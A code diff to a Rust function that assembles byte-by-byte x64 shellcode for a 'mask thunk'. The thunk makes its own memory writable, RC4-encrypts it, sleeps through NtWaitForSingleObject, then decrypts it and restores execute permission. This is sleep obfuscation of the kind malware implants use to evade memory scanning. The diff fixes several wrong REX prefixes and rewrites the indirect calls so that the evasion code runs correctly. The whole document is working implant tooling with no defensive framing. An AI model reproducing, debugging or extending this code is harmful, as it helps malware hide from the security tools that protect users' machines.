@@ -158,7 +158,7 @@ pub fn build_mask_thunk() -> PicThunk {
     // Windows x64 ABI: rcx, rdx, r8, r9, then stack; 32-byte shadow space + align.
     // rcx = INVALID_HANDLE_VALUE (NtCurrentProcess pseudo-handle = (HANDLE)-1).
     //   mov rcx, [r11 + OFF_INVAL]
-    push!(0x4c);
+    push!(0x49);
     push!(0x8b);
     push!(0x4b);
     push!(OFF_INVAL);
@@ -177,7 +177,7 @@ pub fn build_mask_thunk() -> PicThunk {
     push!(0xb9);
     push_u32!(0x04);
     // stack[0x20] = &old_scratch.  lea rax, [r11 + OFF_OLD_SCRATCH]; mov [rsp+0x20], rax
-    push!(0x4c);
+    push!(0x49);
     push!(0x8d);
     push!(0x43);
     push!(OFF_OLD_SCRATCH);
@@ -191,11 +191,13 @@ pub fn build_mask_thunk() -> PicThunk {
     push!(0x83);
     push!(0xec);
     push!(0x28);
-    // call [r11 + OFF_PROTECT]
-    push!(0x41);
-    push!(0xff);
-    push!(0x53);
+    // call protect: mov rax, [r11+OFF_PROTECT]; call rax
+    push!(0x49);
+    push!(0x8b);
+    push!(0x43);
     push!(OFF_PROTECT);
+    push!(0xff);
+    push!(0xd0);
     // add rsp, 0x28
     push!(0x48);
     push!(0x83);
@@ -226,11 +228,13 @@ pub fn build_mask_thunk() -> PicThunk {
     push!(0x83);
     push!(0xec);
     push!(0x20);
-    // call [r11 + OFF_RC4]
-    push!(0x41);
-    push!(0xff);
-    push!(0x53);
+    // call rc4: mov rax, [r11+OFF_RC4]; call rax
+    push!(0x49);
+    push!(0x8b);
+    push!(0x43);
     push!(OFF_RC4);
+    push!(0xff);
+    push!(0xd0);
     // add rsp, 0x20
     push!(0x48);
     push!(0x83);
@@ -239,7 +243,7 @@ pub fn build_mask_thunk() -> PicThunk {
 
     // ---- step 3: NtWaitForSingleObject(INVALID_HANDLE, FALSE=0, &delay) ----
     // rcx = [r11 + OFF_INVAL]
-    push!(0x4c);
+    push!(0x49);
     push!(0x8b);
     push!(0x4b);
     push!(OFF_INVAL);
@@ -256,11 +260,13 @@ pub fn build_mask_thunk() -> PicThunk {
     push!(0x83);
     push!(0xec);
     push!(0x20);
-    // call [r11 + OFF_WAIT]
-    push!(0x41);
-    push!(0xff);
-    push!(0x53);
+    // call wait: mov rax, [r11+OFF_WAIT]; call rax
+    push!(0x49);
+    push!(0x8b);
+    push!(0x43);
     push!(OFF_WAIT);
+    push!(0xff);
+    push!(0xd0);
     // add rsp, 0x20
     push!(0x48);
     push!(0x83);
@@ -287,10 +293,13 @@ pub fn build_mask_thunk() -> PicThunk {
     push!(0x83);
     push!(0xec);
     push!(0x20);
-    push!(0x41);
-    push!(0xff);
-    push!(0x53);
+    // call rc4 (unmask): mov rax, [r11+OFF_RC4]; call rax
+    push!(0x49);
+    push!(0x8b);
+    push!(0x43);
     push!(OFF_RC4);
+    push!(0xff);
+    push!(0xd0);
     push!(0x48);
     push!(0x83);
     push!(0xc4);
@@ -298,7 +307,7 @@ pub fn build_mask_thunk() -> PicThunk {
 
     // ---- step 5: NtProtectVirtualMemory(self=-1, &base, &len, RX=0x10, &old) ----
     // (identical to step 1 but r9 = 0x10 PAGE_EXECUTE_READ)
-    push!(0x4c);
+    push!(0x49);
     push!(0x8b);
     push!(0x4b);
     push!(OFF_INVAL);
@@ -315,7 +324,7 @@ pub fn build_mask_thunk() -> PicThunk {
     push!(0xb9);
     push_u32!(0x10);
     // stack[0x20] = &old_scratch (reuse the same scratch slot)
-    push!(0x4c);
+    push!(0x49);
     push!(0x8d);
     push!(0x43);
     push!(OFF_OLD_SCRATCH);
@@ -328,10 +337,13 @@ pub fn build_mask_thunk() -> PicThunk {
     push!(0x83);
     push!(0xec);
     push!(0x28);
-    push!(0x41);
-    push!(0xff);
-    push!(0x53);
+    // call protect: mov rax, [r11+OFF_PROTECT]; call rax
+    push!(0x49);
+    push!(0x8b);
+    push!(0x43);
     push!(OFF_PROTECT);
+    push!(0xff);
+    push!(0xd0);
     push!(0x48);
     push!(0x83);
     push!(0xc4);
